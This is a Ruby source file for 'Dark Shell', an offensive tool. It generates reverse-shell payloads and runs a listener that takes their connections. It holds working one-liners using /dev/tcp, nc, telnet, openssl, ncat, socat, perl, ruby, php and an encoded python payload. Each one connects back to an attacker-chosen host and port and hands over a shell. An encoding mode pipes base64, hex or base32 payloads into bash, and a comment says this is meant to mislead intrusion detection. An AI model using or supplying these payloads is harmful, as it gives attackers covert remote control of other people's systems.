#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.6.2p47

# Dark shell server written with ruby.
#
# Github:  https://github.com/Green-m/dark-shell
#
# Author:  Green-m (greenm.xxoo@gmail.com)
#
# License: GNU General Public License v3.0
#
# Copyright (c) 2019, Green-m
# All rights reserved.
#

begin
  require 'socket'
  require 'rex'
  require 'rex/socket'
  require 'thread'
  require 'base64'
  require 'base32'
rescue LoadError => e
  puts "ERROR: #{e.message}"
  puts "Try gem install rex rex-socket base32"
  exit
end

class DarkShell
  attr_accessor :ip
  attr_accessor :port

  def initialize(ip, port, en_type)
    @ip       = ip
    @port     = port
    @en_type  = en_type
  end

  # The encryption type
  # Return string.
  def type
    return @type if @type

    case @en_type.downcase
    when "hex"
      @type = "HEX"
    when "base64"
      @type = "BASE64"
    when "base32"
      @type = "BASE32"
    when "ssl"
      @type = "SSL"
    else
      raise "ERROR: unknow encrypt type"
    end

    @type
  end

  # Return string.
  def hex_encode(str)
    str.chars.map{|x| x.ord.to_s(16)}.join
  end

  # Return string.
  def hex_decode(str)
    tmp_str = ""
    str.split("\n").each{|string| string.gsub(/../) { |pair| tmp_str << pair.hex.chr }};

    return tmp_str
  end

  # Return string.
  def base64_encode(str)
    Base64.encode64(str).chomp
  end

  # Return string.
  def base64_decode(str)
    Base64.decode64(str)
  end

  # Return string.
  def base32_encode(str)
    Base32.encode(str)
  end

  #
  # We have to handle the line break manually,
  # cause the Base32.decode cannot parse it correctly.
  # Return string.
  def base32_decode(str)
    Base32.decode(str.delete("\n"))
  end

  #
  # The encode function of shell
  # Return string.
  #
  def encode(str)
    case type
    when "HEX"
      return hex_encode(str)
    when "BASE64"
      return base64_encode(str)
    when "BASE32"
      return base32_encode(str)
    when "SSL"
      # Done in class SslTcpServer
      return str
    end
  end


  #
  # The decode function of shell
  # Return string.
  #
  def decode(str)
    case type
    when "HEX"
      return hex_decode(str)
    when "BASE64"
      return base64_decode(str)
    when "BASE32"
      return base32_decode(str)
    when "SSL"
      # Done in class SslTcpServer
      return str
    end
  end

  # Read from client socket
  def read_from(s)
    case type
    when "HEX", "BASE64", "BASE32"
      return s.recvfrom(40000000)[0].chomp
    when "SSL"
      # Done in class SslTcpServer
      return s.read
    end
  end

  # Write into client socket
  def write_into(s, command)
    case type
    when "HEX", "SSL", "BASE64", "BASE32"
      s.puts(command + "\n")
    end
  end

  #
  # Generate dark shell client command.
  # return Array.
  #
  def generate_raw
    case type
    when 'HEX'
      return hex_commands.map{|e|e.gsub('127.0.0.1',ip).gsub('13337', port)}
    when 'BASE64'
      return base64_commands.map{|e|e.gsub('127.0.0.1',ip).gsub('13337', port)}
    when 'BASE32'
      return base32_commands.map{|e|e.gsub('127.0.0.1',ip).gsub('13337', port)}
    when 'SSL'
      return ssl_commands.map do |e|
        if e.start_with?('python -c "exec') # python string
          # Decode the python code, modify the ip,port, encode it and replace the raw base64 string.
          py_code_b64_str = e.match(%r"'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'").to_s.delete('\'')
          py_code_str     = Base64.decode64(py_code_b64_str)
          py_new_b64_str  = Base64.encode64(py_code_str.gsub('127.0.0.1',ip).gsub('13337', port)).delete("\n")
          e.gsub(py_code_b64_str, py_new_b64_str)
        else
          e.gsub('127.0.0.1',ip).gsub('13337', port)
        end
      end
    end
  end

  #
  # Generate encode commands by generate_raw
  # Just a little trick to mislead ids, maybe.
  # return array.
  #
  def generate_encode
    commands = []

    generate_raw.each do |cmd|
      commands << cmd
      commands << "sh -c '{echo,#{Base64.encode64(cmd).delete("\n")}}|{base64,-d}|{bash,-i}'"
      commands << "sh -c '{echo,#{hex_encode(cmd)}}|{xxd,-p,-r}|{bash,-i}'"
      commands << "sh -c '{echo,#{base32_encode(cmd).delete("\n")}}|{base32,-d}|{bash,-i}'"
      #commands << "echo #{Base64.encode64(cmd).delete("\n")}|base64 -d|bash -i"
    end

    commands
  end


  def listen
    if type == 'SSL'
      server = Rex::Socket::SslTcpServer.create('LocalHost' => ip, 'LocalPort' => port)
    else
      server = TCPServer.new(ip, port)
    end
    puts "Type: '#{type}'"
    puts "Starting listen #{ip}:#{port}"

    loop do
      Thread.start(server.accept) do |client|
        puts "Received from #{client.remote_address.inspect_sockaddr}"
        puts "Input is ready."

        # Receive user input and send it to remote.
        Thread.new do
          while true
            command = STDIN.gets.chomp
            cmd = encode(command)
            # For debug
            #puts("Raw>>" + cmd)
            begin
              write_into(client, cmd)
            rescue Errno::EPIPE => e
              puts "ERROR: write data error"
              puts e
              exit
            end
          end
        end

        # Handle incoming data and print it to stdout.
        while true
          ready = IO.select([client], nil, nil, 10)
          if ready
            begin
              res =  read_from(client)
            rescue Errno::ECONNRESET => e
              puts "ERROR: read data error"
              puts e
              exit
            end
            if res.length > 0
              # For debug
              #puts("Raw << " + res.inspect)
              print ">"
              puts decode(res)
            end
          end

        end
      end
    end
  end

  # Return array
  def hex_commands
    commands = []
    commands << '0<&137-;exec 137<>/dev/tcp/127.0.0.1/13337;cat <&137 |while read ff; do echo $ff|xxd -r -p|sh |xxd -p >&137 2>&137;done'
    commands << 'mknod backpipe p;tail -f backpipe |nc 127.0.0.1 13337 | while read ff; do echo $ff|xxd -r -p|sh|xxd -p &> backpipe;done;rm backpipe'
    commands << 'mknod backpipe p;tail -f backpipe |telnet 127.0.0.1 13337 | while read ff; do echo $ff|xxd -r -p|sh|xxd -r -p &> backpipe;done;rm backpipe'
  end

  # Return array
  def base64_commands
    hex_commands.map{|e|e.gsub('xxd -r -p','base64 -d').gsub('xxd -p', 'base64')}
  end

  # Return array
  def base32_commands
    hex_commands.map{|e|e.gsub('xxd -r -p','base32 -d').gsub('xxd -p', 'base32')}
  end

  # Return array
  def ssl_commands
    commands = []
    commands << 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:13337 > /tmp/s; rm /tmp/s'
    commands << 'ncat --ssl 127.0.0.1 13337 -e /bin/bash'
    commands << %q{socat exec:'bash' openssl-connect:127.0.0.1:13337,verify=0}
    commands << %q{perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"127.0.0.1:13337",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'}
    commands << %q{ruby -rsocket -ropenssl -e 'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("127.0.0.1","13337")).connect;while(cmd=c.gets);puts(cmd);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'}
    commands << %q{php -r '$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://127.0.0.1:13337",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode("\n",$o);$o.="\n";fputs($s,$o);}}'&}
    commands << %q{python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHNzbApzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzEyNy4wLjAuMScsMTMzMzcpKQpzPXNzbC53cmFwX3NvY2tldChzbykKeW49RmFsc2UKd2hpbGUgbm90IHluOgogICAgZGF0YT1zLnJlY3YoMTAyNCkKICAgIGlmIGxlbihkYXRhKT09MDoKICAgICAgICB5biA9IFRydWUKICAgIHByb2M9c3VicHJvY2Vzcy5Qb3BlbihkYXRhLHNoZWxsPVRydWUsc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSxzdGRlcnI9c3VicHJvY2Vzcy5QSVBFLHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKICAgIHN0ZG91dF92YWx1ZT1wcm9jLnN0ZG91dC5yZWFkKCkgKyBwcm9jLnN0ZGVyci5yZWFkKCkKICAgIHMuc2VuZChzdGRvdXRfdmFsdWUpCg=='.decode('base64'))" >/dev/null 2>&1}
  end

end

puts %q{

____             _         ____  _          _ _
|  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
| | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
| |_| | (_| | |  |   <      ___) | | | |  __/ | |
|____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|


See more: https://github.com/Green-m/dark-shell

}



if ARGV.length == 0 || ARGV.include?("-h") || ARGV.include?("help")
  puts "Dark shell listen server."
  puts
  puts "Usage:"
  puts "  ruby #{__FILE__} <action> <ipaddress> <port> <type>"
  puts "Action: gen, listen, gencode"
  puts "  gen:      generate payload to run."
  puts "  gencode:  generate payload(encoded) to run."
  puts "  listen:   listen as a server."
  puts
  puts "Type: hex, ssl, base64, base32"
  puts
  puts
  puts "Example:"
  puts "  ruby #{__FILE__} listen 127.0.0.1 4444 hex"
  puts "  ruby #{__FILE__} listen 0.0.0.0 4444"
  puts "  ruby #{__FILE__} listen"
  puts "  ruby #{__FILE__} gencode 8.8.8.8 1337 ssl"
  puts "  ruby #{__FILE__} gen 8.8.8.8 4444 base64"
  puts "  ruby #{__FILE__} gen"
  exit
end

action  = ARGV[0] || ""
ip      = ARGV[1] || "127.0.0.1"
port    = ARGV[2] || '4444'
en_type = ARGV[3] || "hex"


darkshell = DarkShell.new(ip, port, en_type)
#puts darkshell.base64_commands
case action.downcase
when "gen"
  puts "#{darkshell.type.upcase} payload to connect #{darkshell.ip}:#{darkshell.port}"
  puts ""
  darkshell.generate_raw.each{|x| puts "";puts "    " + x}
when "gencode"
  puts "#{darkshell.type.upcase} payload to connect #{darkshell.ip}:#{darkshell.port}"
  puts ""

  # Too much if we print all commands.
  # darkshell.generate_base64.each{|x| puts "";puts "    " + x}
  darkshell.generate_encode.each_with_index do |cmd, index|
    if index % 4 == 0
      puts
      puts "---------------------------------------------------------------"
      puts
    end

    puts "    " + cmd
  end


when "listen"
  darkshell.listen
else
  puts "ERROR: no this action, <action> should be listen, gen, gencode."
end